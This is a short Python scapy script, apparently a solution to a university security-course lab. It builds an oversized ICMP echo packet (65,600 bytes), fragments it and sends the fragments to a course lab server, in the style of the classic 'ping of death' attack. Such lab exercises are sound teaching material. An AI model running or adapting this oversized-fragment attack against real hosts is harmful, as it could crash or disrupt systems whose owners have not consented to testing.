from scapy.all import *
import sys
import socket
import struct

def readn(s, n):
    buf = b''
    while len(buf) <n:
        buf += s.recv(n-len(buf))

    return buf

PORT = int(sys.argv[1])

ip_layer = IP(src = "192.168.222.1", dst="192.168.222.2")
icmp_layer = ICMP(type = 8, code = 0)
payload = Raw("Hi from ICMP")

ip_layer.show()
icmp_layer.show()

pkt = ip_layer / icmp_layer / ('X'*65600)
# pkt.show()

frags = fragment(pkt, fragsize = 1480)
print("Number of fragments: ")
print(len(frags))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect(('cs177.seclab.cs.ucsb.edu', PORT))

for i in range (len(frags)):
    pkt_data = None
    pkt_data = raw(frags[i])
    
    # if(i == (len(frags) -1)):

    #     last_pkt = ip_layer / icmp_layer / ('X'*1480)
    #     pkt_data = last_pkt
    #     #pkt_data += (b'X'* (1500- len(pkt_data)))

    # print("Len of packet: ")
    # print(len(pkt_data))
    #print(pkt_data)
    s.sendall(struct.pack(">H", len(pkt_data)))
    s.sendall(pkt_data)

while True:
    length = struct.unpack(">H", readn(s,2))[0]
    data = readn(s, length)
    print("Server responsed with : ", data)
    IP(data).show()


response = sr1(pkt)
response.show()
